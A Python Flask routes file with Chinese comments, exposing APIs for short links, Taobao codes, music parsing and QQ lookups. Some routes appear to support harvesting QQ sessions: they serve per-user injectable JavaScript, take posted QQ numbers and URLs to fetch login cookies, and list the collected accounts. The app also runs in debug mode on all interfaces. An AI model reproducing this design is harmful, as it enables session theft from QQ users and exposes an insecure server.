from module.dwz import dwz
from module.tao import TaoText
from module.yuming import YmTool
from module.music import MusicScript
from module.qq import QQ
from module.updateCookie import updataCookie,WeiboCookieUpdata
from module.imgDown import ImgDown
from module.axjs import axJs
from qx.qx import qqLogin
from app import app, errmsg, request,jsonify


# 短网址API 路由
@app.route('/dwz', methods=['GET'])
def index():
    try:
        url = request.args.get('url')
        code = request.args.get('code')
        return dwz(url, code).content
    except Exception as e:
        return errmsg


# 淘口令API
@app.route('/tao')
def tao():
    try:
        text = request.args.get('text')
        url = request.args.get('url')
        logo = request.args.get('logo')
        return TaoText(text, url, logo).content
    except Exception as e:
        return errmsg


# 域名备案拦截检测
@app.route('/ym')
def ym():
    try:
        url = request.args.get('url')
        return YmTool(url).content
    except Exception as e:
        return errmsg


# QQ，网易云解析
@app.route('/music')
def music():
    try:
        uid = request.args.get('uid')
        id = request.args.get('id')
        return MusicScript(uid, id).content
    except Exception as e:
        print(e)
        return errmsg


# qq 信息查询
@app.route('/qq')
def qq():
    try:
        code = request.args.get('code')
        qq = request.args.get('qq')
        return QQ(code, qq).content
    except Exception as e:
        print(e)
        return errmsg


# 更新cookie
@app.route('/update')
def update():
    WeiboCookieUpdata().updata()
    return updataCookie().content


# 获取 qx js
@app.route('/js/<int:id>.js')
def jscode(id):
    qx = axJs(id)
    if qx.content():
        return qx.jsCode()
    else:
        return '1222112'


# 获取挂载js
@app.route('/jscode/<int:id>.js')
def getjscode(id):
    qx = axJs(id)
    if qx.content():
        return qx.js()
    else:
        return '1222112'

# 验证用户ID

@app.route('/js/id/<int:id>')
def idinfo(id):
    qx = axJs(id)
    if qx.content():
        return jsonify({'code':0})
    else:
        return jsonify({'code':400})


# 获取好友

@app.route('/sj/<int:id>',methods=['POST', 'GET'])
def shouji(id):
    uin = request.form.get('uin')
    url = request.form.get('url')
    qqLogin(id,uin,url).getCookie()
    return str(id)



# 账号下QQ列表
@app.route('/js/info/<int:id>')
def userinfo(id):

    return jsonify({'data':axJs(id).info(),'code':0})


# QQ详细信息

@app.route('/js/info/')
def info():
    id = request.args.get('id')
    qq = request.args.get('qq')

    return jsonify({'data': axJs(id,qq).userInfo(), 'code': 0})

@app.route('/imgfile',methods=['POST'])
def imgfile():
    try:
        code = request.form.get('code')
        img = request.form.get('img')
        return ImgDown(code, img).content
    except Exception as e:
        print(e)
        return errmsg

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8807, debug=True)
